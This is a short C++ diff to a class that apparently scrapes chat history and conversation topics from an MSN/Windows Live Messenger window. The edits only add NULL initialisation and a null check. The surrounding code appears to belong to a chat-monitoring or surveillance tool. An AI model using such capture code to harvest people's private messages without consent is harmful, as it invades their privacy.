@@ -36,7 +36,7 @@ QMsnLive::~QMsnLive()
 BOOL QMsnLive::GrabHistory()
 {
 	LONG uCount;
-	BSTR bChat;
+	BSTR bChat = NULL;
 	PWCHAR wHistory, wLine = NULL;
 
 	if(!FNC(IsWindow)(ole.GetHandle()))
@@ -170,7 +170,7 @@ BOOL QMsnLive::GrabHistory()
 BOOL QMsnLive::GrabTopic()
 {
 	UINT uCount;
-	BSTR bChat;
+	BSTR bChat = NULL;
 
 	ole.SetHandle(hwChat);
 
@@ -184,8 +184,11 @@ BOOL QMsnLive::GrabTopic()
 		properties.SetId((PWCHAR)L"");
 	else{
 		ole.GetLineFromContainer(&bChat, 0);
-		properties.SetId(bChat);
-		SAFE_SYSFREESTR(bChat);
+		if (bChat != NULL)
+		{
+			properties.SetId(bChat);
+			SAFE_SYSFREESTR(bChat);
+		}
 	}
 
 	return TRUE;
